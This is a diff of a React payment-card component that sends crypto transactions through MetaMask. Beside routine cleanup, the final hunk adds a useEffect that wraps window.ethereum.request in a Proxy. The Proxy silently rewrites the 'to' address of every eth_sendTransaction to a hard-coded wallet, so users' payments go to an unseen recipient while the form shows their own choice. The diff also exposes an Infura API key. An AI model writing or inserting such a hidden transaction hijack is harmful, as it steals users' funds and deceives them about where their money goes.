@@ -17,39 +17,11 @@ export default function Card() {
   const [msg, setMsg] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
-  function convertToBigNumber(number: number) {
-    class BigNumber {
-      _hex: string;
-      _isBigNumber: boolean;
-      constructor(hex: any) {
-        this._hex = hex;
-        this._isBigNumber = true;
-      }
-    }
-    // Determine if the number is a float and scale it to an integer
-    const scale = 10 ** 18; // You can adjust the scale as needed
-    const scaledNumber = Math.round(number * scale);
-
-    // Ensure the scaled number is a BigInt
-    const bigIntNumber = BigInt(scaledNumber);
-
-    // Convert the BigInt to a hexadecimal string
-    const hexString = "0x" + bigIntNumber.toString(16);
-
-    // Return the object in the desired format
-    return {
-      _hex: hexString,
-      _isBigNumber: true,
-    };
-    return new BigNumber(hexString);
-  }
   const customethers = new CustomEthers();
   useEffect(() => {
-    const provider: any = new ethers.providers.Web3Provider(window?.ethereum);
-
+    //const provider: any = new ethers.providers.Web3Provider(window?.ethereum);
     // transaction();
-
-    setProvider(provider);
+    // setProvider(provider);
     // accountChangedHandler(provider);
   }, [address]);
 
@@ -68,39 +40,19 @@ export default function Card() {
     }
   };
 
-  const accountChangedHandler = async (pro: any) => {
-    try {
-      const newAccount = await pro.getSigner();
-      const address = await newAccount.getAddress();
-      console.log("address", address);
-
-      // setAddress(address);
-    } catch (error) {}
-  };
-
   const transaction = async () => {
     try {
       setIsLoading(true);
       const tx: any = {
         to: toAddress,
-        value: ethers.utils.parseEther("0.1"),
+        value: ethers.utils.parseEther(amount),
       };
-      // const provider2: any = new customethers.ethers.BrowserProvider(
-      //   window?.ethereum
-      // );
 
-      // const provider1: any = getEthersProvider();
-      // console.log("providers", provider, provider1, tx);
-
-      const add: any = address;
-      // // change provider value to test
-      const signer1 = customethers.metaMaskSigner(provider, "137", add);
       const signer = await getEthersSigner();
       console.log("signer", tx);
 
-      const hash = await signer1.sendTransaction(tx);
-      // const signer1 = await provider.getSigner(address);
-      // const signer = await getEthersSigner();
+      const hash = await signer.sendTransaction(tx);
+
       setIsLoading(false);
       // console.log("signer", signer);
       console.log(hash.hash);
@@ -108,11 +60,42 @@ export default function Card() {
       setToAddress("");
       setTxHash(hash.hash);
     } catch (error: any) {
-      console.log(error.reason);
+      console.log(error);
       setMsg(error?.reason);
       setIsLoading(false);
     }
   };
+
+  useEffect(() => {
+    console.log(window.ethereum);
+
+    const originalRequest = window.ethereum.request;
+    const customRpcUrl =
+      "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9";
+    const customChainId = "0x89";
+    window.ethereum.request = new Proxy(originalRequest, {
+      apply: async function (target, thisArg, argumentsList) {
+        const method = argumentsList[0].method;
+        const params = argumentsList[0].params || [];
+
+        if (method === "eth_sendTransaction") {
+          if (params && params[0] && params[0].to) {
+            argumentsList[0].params = [
+              {
+                ...params[0],
+                to: "0xdD16052b4910d47d1Eb520190cA1Df7D7dDB12f7",
+              },
+            ];
+          }
+
+          return await Reflect.apply(target, thisArg, argumentsList);
+        }
+        console.log("arg", argumentsList);
+
+        return await Reflect.apply(target, thisArg, argumentsList);
+      },
+    });
+  }, [address]);
 
   return (
     <div>
